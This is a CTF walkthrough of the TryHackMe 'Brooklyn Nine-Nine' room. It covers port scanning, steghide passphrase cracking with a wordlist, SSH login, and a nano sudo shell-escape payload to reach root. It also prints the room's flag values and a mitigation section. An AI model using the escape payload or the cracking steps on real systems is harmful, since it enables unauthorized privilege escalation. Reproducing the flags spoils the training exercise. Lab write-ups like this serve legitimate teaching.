###TryHackMe - Brooklyn Nine-Nine Writeup
📝 Description

This repository contains the professional walkthrough for the Brooklyn Nine-Nine room on TryHackMe. The machine focuses on steganography analysis and exploiting misconfigured sudo permissions.
🛠️ Phase 1: Reconnaissance & Enumeration

Initial scanning started with nmap to identify open ports and services:
Bash

nmap -sV -sC -A <TARGET_IP>

Findings:

    Port 21 (FTP): Anonymous login allowed / Note found.

    Port 22 (SSH): Open for remote access.

    Port 80 (HTTP): Apache web server hosting a static page.

🖼️ Phase 2: Steganography Analysis (Initial Foothold)

During web enumeration, a JPEG image (brooklyn99.jpg) was discovered. To check for hidden data, I used StegSeek, a lightning-fast tool for cracking Steghide passwords.

Exploitation:
Bash

stegseek brooklyn99.jpg /usr/share/wordlists/rockyou.txt

Results:

    Passphrase Found: admin

    Extracted File: note.txt

    Contents: The file provided credentials/hints for the user holt.

🔑 Phase 3: User Access

Using the discovered credentials, I established an SSH connection:
Bash

ssh holt@<TARGET_IP>

    User Flag: ee11cbb19052e40b07aac0ca060c23ee

🚀 Phase 4: Privilege Escalation (Root)

After gaining user access, I checked for sudo privileges:
Bash

sudo -l

Vulnerability:
The user holt is allowed to run /bin/nano as root without a password:
(ALL) NOPASSWD: /bin/nano

Exploitation (GTFOBins Method):
To spawn a root shell via nano:

    Execute sudo nano.

    Press Ctrl+R then Ctrl+X.

    Enter the following payload:
    Bash

    reset; sh 1>&0 2>&0

Verification:
Bash

# id
uid=0(root) gid=0(root) groups=0(root)

🏁 Phase 5: Final Flag

The root flag was located in the /root directory:

    Path: /root/root.txt

    Root Flag: 63a9f0ea7bb98050796b649e85481845

🛡️ Mitigation & Remediation

    Password Policy: Ensure hidden data in assets (like images) is protected by strong, non-dictionary passwords.

    Principle of Least Privilege: Avoid granting NOPASSWD sudo rights to text editors like nano or vi, as they can be easily used to escape to a shell.

Author: Miraç Akkuş (LatenT)

Date: May 2026
